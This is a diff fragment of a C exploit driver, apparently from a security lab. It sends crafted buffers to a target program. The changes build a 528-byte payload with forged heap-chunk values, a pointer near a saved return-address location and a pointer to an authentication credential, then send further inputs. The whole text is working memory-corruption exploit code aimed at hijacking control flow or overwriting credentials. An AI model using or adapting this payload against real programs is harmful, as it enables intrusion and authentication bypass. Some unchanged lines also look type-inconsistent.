@@ -39,14 +39,14 @@ int main() {
     send();
     get_formatted("%*s");
 
-    explsz = 528;
-    *expl = (void**)malloc(explsz);
+    unsigned explsz = 528;
+    void* *expl = (void**)malloc(explsz);
     // Initialize the buffer with '\1' to make the contents predictable.
     memset((void*)expl, '\1', explsz);
     expl[explsz/sizeof(void*)-4] = (void*) 0x0000000000000000;
     expl[explsz/sizeof(void*)-3] = (void*) 0x00000000000001f0;
-    expl[explsz/sizeof(void*)-2] = (void*) cur_return_addr_loc;
-    expl[explsz/sizeof(void*)-1] = (void*) curr_auth_cred;
+    expl[explsz/sizeof(void*)-1] = (void*) cur_return_addr_loc - 16;
+    expl[explsz/sizeof(void*)-2] = (void*) curr_auth_cred;
 
     put_str("p ");
     put_bin((char*)expl, explsz);
@@ -57,6 +57,8 @@ int main() {
     put_str("p 1234567");
     send();
     get_formatted("%*s");
+
+
 
     explsz = auth_db_cred_dist - 8;
     *expl = (void**)malloc(explsz);
@@ -104,6 +106,10 @@ int main() {
     put_str("p ");
     put_bin((char*)expl, explsz);
     put_str("\n");
+    send();
+    get_formatted("%*s");
+
+    put_str("p 1234567\n");
     send();
     get_formatted("%*s");
 
